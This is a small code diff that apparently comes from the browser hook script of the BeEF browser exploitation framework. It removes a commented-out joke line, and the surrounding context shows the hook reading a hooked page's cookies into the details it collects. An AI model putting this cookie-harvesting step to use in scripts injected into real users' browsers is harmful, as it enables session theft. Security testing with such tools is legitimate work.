@@ -4265,9 +4265,6 @@ beef.browser = {
 
         try {
             var cookies = document.cookie;
-            /* Never stop the madness dear C.
-             * var veglol = beef.browser.cookie.veganLol();
-             */
             if (cookies) details['browser.window.cookies'] = cookies;
         } catch (e) {
             beef.debug("Cookies can't be read. The hooked origin is most probably using HttpOnly.");
